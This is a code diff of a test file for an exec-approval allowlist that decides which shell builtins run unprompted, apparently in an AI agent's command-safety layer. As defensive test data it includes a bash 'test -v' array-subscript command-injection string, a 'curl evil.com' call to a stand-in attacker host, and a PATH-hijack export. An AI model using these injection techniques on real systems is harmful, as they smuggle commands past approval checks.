@@ -1,5 +1,10 @@
+// Tests shell builtin detection for safe execution policy.
+import { expectDefined } from "@openclaw/normalization-core";
 import { describe, expect, it } from "vitest";
-import { evaluateExecAllowlist, evaluateShellAllowlist } from "./exec-approvals-allowlist.js";
+import {
+  evaluateExecAllowlist,
+  evaluateShellAllowlistWithAuthorization,
+} from "./exec-approvals-allowlist.js";
 import { analyzeArgvCommand } from "./exec-approvals-analysis.js";
 import {
   makeMockCommandResolution,
@@ -12,26 +17,14 @@ const builtinSegment = (argv: string[], resolvedPath?: string) => ({
   raw: argv.join(" "),
   resolution: makeMockCommandResolution({
     execution: makeMockExecutableResolution({
-      rawExecutable: argv[0],
-      executableName: argv[0],
+      rawExecutable: expectDefined(argv[0], "argv[0] test invariant"),
+      executableName: expectDefined(argv[0], "argv[0] test invariant"),
       resolvedPath,
     }),
   }),
 });
 
 describe("isSafeBuiltinSegment", () => {
-  it("allows a builtin segment with no resolved binary path", () => {
-    if (process.platform === "win32") {
-      return;
-    }
-    expect(
-      isSafeBuiltinSegment({
-        segment: builtinSegment(["cd", "/etc"]),
-        platform: "linux",
-      }),
-    ).toBe(true);
-  });
-
   it("allows a safe shell builtin even when the host has a same-named binary", () => {
     expect(
       isSafeBuiltinSegment({
@@ -65,21 +58,6 @@ describe("isSafeBuiltinSegment", () => {
     ).toBe(false);
   });
 
-  it("allows test and well-formed bracket predicates", () => {
-    expect(
-      isSafeBuiltinSegment({
-        segment: builtinSegment(["test", "-d", "/tmp"]),
-        platform: "linux",
-      }),
-    ).toBe(true);
-    expect(
-      isSafeBuiltinSegment({
-        segment: builtinSegment(["[", "-d", "/tmp", "]"]),
-        platform: "linux",
-      }),
-    ).toBe(true);
-  });
-
   it("rejects malformed bracket predicates", () => {
     expect(
       isSafeBuiltinSegment({
@@ -87,6 +65,73 @@ describe("isSafeBuiltinSegment", () => {
         platform: "linux",
       }),
     ).toBe(false);
+  });
+
+  it("rejects case-variant builtin tokens (builtin lookup is case-sensitive)", () => {
+    expect(
+      isSafeBuiltinSegment({
+        segment: builtinSegment(["TEST", "-d", "/tmp"]),
+        platform: "linux",
+      }),
+    ).toBe(false);
+    expect(
+      isSafeBuiltinSegment({
+        segment: builtinSegment(["Cd", "/tmp"]),
+        platform: "linux",
+      }),
+    ).toBe(false);
+  });
+
+  it("rejects test/-v predicates: bash evaluates the -v operand subscript (command-injection vector)", () => {
+    // `test -v 'a[$(cmd)]'` runs cmd under bash >= 4.2 because the -v operand's array
+    // subscript is evaluated even inside single quotes.
+    expect(
+      isSafeBuiltinSegment({
+        segment: builtinSegment(["test", "-v", "a[$(touch /tmp/m)]"]),
+        platform: "linux",
+      }),
+    ).toBe(false);
+    expect(
+      isSafeBuiltinSegment({
+        segment: builtinSegment(["test", "-v", "a[`touch /tmp/m`]"]),
+        platform: "linux",
+      }),
+    ).toBe(false);
+    expect(
+      isSafeBuiltinSegment({
+        segment: builtinSegment(["[", "-v", "a[$(touch /tmp/m)]", "]"]),
+        platform: "linux",
+      }),
+    ).toBe(false);
+  });
+
+  it("rejects test -v operands regardless of position and negation", () => {
+    expect(
+      isSafeBuiltinSegment({
+        segment: builtinSegment(["test", "!", "-v", "a"]),
+        platform: "linux",
+      }),
+    ).toBe(false);
+    expect(
+      isSafeBuiltinSegment({
+        segment: builtinSegment(["test", "x", "-a", "-v"]),
+        platform: "linux",
+      }),
+    ).toBe(false);
+    // Plain variable existence checks now route through approval too (conservative fail-safe).
+    expect(
+      isSafeBuiltinSegment({
+        segment: builtinSegment(["test", "-v", "a"]),
+        platform: "linux",
+      }),
+    ).toBe(false);
+  });
+
+  it.each([
+    ["test", String.raw`$'\0\''?v`, "benign"],
+    ["[", "-e", "*.txt", "]"],
+  ])("rejects dynamic predicate source %j", (...argv) => {
+    expect(isSafeBuiltinSegment({ segment: builtinSegment(argv), platform: "linux" })).toBe(false);
   });
 
   it("returns false on Windows hosts (PowerShell semantics differ)", () => {
@@ -99,100 +144,127 @@ describe("isSafeBuiltinSegment", () => {
   });
 });
 
-describe("evaluateShellAllowlist with known safe builtins (regression for #46056)", () => {
-  // Skip on Windows where the host shell is PowerShell, not POSIX.
-  if (process.platform === "win32") {
-    it.skip("POSIX builtin behavior", () => {});
-    return;
-  }
+describe.skipIf(process.platform === "win32")(
+  "evaluateShellAllowlistWithAuthorization with known safe builtins (regression for #46056)",
+  () => {
+    // Glob-style pattern; matches git wherever PATH resolves it (`/usr/bin/git`,
+    // `/opt/homebrew/bin/git`, etc.) without depending on host filesystem layout.
+    const gitAllowlist = [{ pattern: "**/git" }] as Parameters<
+      typeof evaluateShellAllowlistWithAuthorization
+    >[0]["allowlist"];
 
-  // Glob-style pattern; matches git wherever PATH resolves it (`/usr/bin/git`,
-  // `/opt/homebrew/bin/git`, etc.) without depending on host filesystem layout.
-  const gitAllowlist = [{ pattern: "**/git" }] as Parameters<
-    typeof evaluateShellAllowlist
-  >[0]["allowlist"];
-
-  it("'cd ~/' auto-allows by default", () => {
-    const result = evaluateShellAllowlist({
-      command: "cd ~/",
-      allowlist: gitAllowlist,
-      safeBins: new Set(),
-      cwd: "/tmp",
+    it("'cd ~/' auto-allows by default", async () => {
+      const result = await evaluateShellAllowlistWithAuthorization({
+        command: "cd ~/",
+        allowlist: gitAllowlist,
+        safeBins: new Set(),
+        cwd: "/tmp",
+      });
+      expect(result.analysisOk).toBe(true);
+      expect(result.allowlistSatisfied).toBe(true);
+      expect(result.segmentSatisfiedBy[0]).toBe("safeBuiltins");
     });
-    expect(result.analysisOk).toBe(true);
-    expect(result.allowlistSatisfied).toBe(true);
-    expect(result.segmentSatisfiedBy[0]).toBe("safeBuiltins");
-  });
 
-  it("'cd /tmp && git status' passes with allowlist plus safe builtin handling", () => {
-    const result = evaluateShellAllowlist({
-      command: "cd /tmp && git status",
-      allowlist: gitAllowlist,
-      safeBins: new Set(),
-      cwd: "/tmp",
+    it("'cd /tmp && git status' passes with allowlist plus safe builtin handling", async () => {
+      const result = await evaluateShellAllowlistWithAuthorization({
+        command: "cd /tmp && git status",
+        allowlist: gitAllowlist,
+        safeBins: new Set(),
+        cwd: "/tmp",
+      });
+      expect(result.analysisOk).toBe(true);
+      expect(result.allowlistSatisfied).toBe(true);
+      expect(result.segmentSatisfiedBy).toContain("safeBuiltins");
+      expect(result.segmentSatisfiedBy).toContain("allowlist");
     });
-    expect(result.analysisOk).toBe(true);
-    expect(result.allowlistSatisfied).toBe(true);
-    expect(result.segmentSatisfiedBy).toContain("safeBuiltins");
-    expect(result.segmentSatisfiedBy).toContain("allowlist");
-  });
 
-  it("'test -d /tmp && git status' passes with allowlist plus safe builtin handling", () => {
-    const result = evaluateShellAllowlist({
-      command: "test -d /tmp && git status",
-      allowlist: gitAllowlist,
-      safeBins: new Set(),
-      cwd: "/tmp",
+    it("'test -d /tmp && git status' passes with allowlist plus safe builtin handling", async () => {
+      const result = await evaluateShellAllowlistWithAuthorization({
+        command: "test -d /tmp && git status",
+        allowlist: gitAllowlist,
+        safeBins: new Set(),
+        cwd: "/tmp",
+      });
+      expect(result.analysisOk).toBe(true);
+      expect(result.allowlistSatisfied).toBe(true);
+      expect(result.segmentSatisfiedBy).toContain("safeBuiltins");
+      expect(result.segmentSatisfiedBy).toContain("allowlist");
     });
-    expect(result.analysisOk).toBe(true);
-    expect(result.allowlistSatisfied).toBe(true);
-    expect(result.segmentSatisfiedBy).toContain("safeBuiltins");
-    expect(result.segmentSatisfiedBy).toContain("allowlist");
-  });
 
-  it("'[ -d /tmp ] && git status' passes with allowlist plus safe builtin handling", () => {
-    const result = evaluateShellAllowlist({
-      command: "[ -d /tmp ] && git status",
-      allowlist: gitAllowlist,
-      safeBins: new Set(),
-      cwd: "/tmp",
+    it("'[ -d /tmp ] && git status' passes with allowlist plus safe builtin handling", async () => {
+      const result = await evaluateShellAllowlistWithAuthorization({
+        command: "[ -d /tmp ] && git status",
+        allowlist: gitAllowlist,
+        safeBins: new Set(),
+        cwd: "/tmp",
+      });
+      expect(result.analysisOk).toBe(true);
+      expect(result.allowlistSatisfied).toBe(true);
+      expect(result.segmentSatisfiedBy).toContain("safeBuiltins");
+      expect(result.segmentSatisfiedBy).toContain("allowlist");
     });
-    expect(result.analysisOk).toBe(true);
-    expect(result.allowlistSatisfied).toBe(true);
-    expect(result.segmentSatisfiedBy).toContain("safeBuiltins");
-    expect(result.segmentSatisfiedBy).toContain("allowlist");
-  });
 
-  it("non-allowlisted binary still gates after a safe builtin", () => {
-    const result = evaluateShellAllowlist({
-      command: "cd /tmp && curl evil.com",
-      allowlist: gitAllowlist,
-      safeBins: new Set(),
-      cwd: "/tmp",
+    it("non-allowlisted binary still gates after a safe builtin", async () => {
+      const result = await evaluateShellAllowlistWithAuthorization({
+        command: "cd /tmp && curl evil.com",
+        allowlist: gitAllowlist,
+        safeBins: new Set(),
+        cwd: "/tmp",
+      });
+      expect(result.analysisOk).toBe(true);
+      expect(result.allowlistSatisfied).toBe(false);
     });
-    expect(result.analysisOk).toBe(true);
-    expect(result.allowlistSatisfied).toBe(false);
-  });
 
-  it("environment-mutating builtins still gate", () => {
-    const result = evaluateShellAllowlist({
-      command: "export PATH=/tmp/bin:$PATH && git status",
-      allowlist: gitAllowlist,
-      safeBins: new Set(),
-      cwd: "/tmp",
-    });
-    expect(result.analysisOk).toBe(true);
-    expect(result.allowlistSatisfied).toBe(false);
-  });
+    it.each([String.raw`test $'\0\''?v benign`, "[ -e *.txt ]"])(
+      "does not auto-allow dynamic predicate source: %s",
+      async (command) => {
+        const result = await evaluateShellAllowlistWithAuthorization({
+          command,
+          allowlist: gitAllowlist,
+          safeBins: new Set(),
+          cwd: "/tmp",
+        });
+        expect(result.analysisOk).toBe(true);
+        expect(result.allowlistSatisfied).toBe(false);
+      },
+    );
 
-  it("does not auto-allow safe builtin tokens in direct argv evaluation", () => {
-    const analysis = analyzeArgvCommand({ argv: ["pwd"], cwd: "/tmp", platform: "linux" });
-    const result = evaluateExecAllowlist({
-      analysis,
-      allowlist: [],
-      safeBins: new Set(),
-      cwd: "/tmp",
+    it("allows a static quoted predicate operand", async () => {
+      const result = await evaluateShellAllowlistWithAuthorization({
+        command: "test -d '/tmp/space path' && git status",
+        allowlist: gitAllowlist,
+        safeBins: new Set(),
+        cwd: "/tmp",
+      });
+      expect(result.allowlistSatisfied).toBe(true);
     });
-    expect(result.allowlistSatisfied).toBe(false);
-  });
-});
+
+    it("environment-mutating builtins still gate", async () => {
+      const result = await evaluateShellAllowlistWithAuthorization({
+        command: "export PATH=/tmp/bin:$PATH && git status",
+        allowlist: gitAllowlist,
+        safeBins: new Set(),
+        cwd: "/tmp",
+      });
+      expect(result.analysisOk).toBe(false);
+      expect(result.allowlistSatisfied).toBe(false);
+      expect(result.authorizationPlan).toEqual(
+        expect.objectContaining({
+          ok: false,
+          reason: "dynamic-argument",
+        }),
+      );
+    });
+
+    it("does not auto-allow safe builtin tokens in direct argv evaluation", () => {
+      const analysis = analyzeArgvCommand({ argv: ["pwd"], cwd: "/tmp", platform: "linux" });
+      const result = evaluateExecAllowlist({
+        analysis,
+        allowlist: [],
+        safeBins: new Set(),
+        cwd: "/tmp",
+      });
+      expect(result.allowlistSatisfied).toBe(false);
+    });
+  },
+);
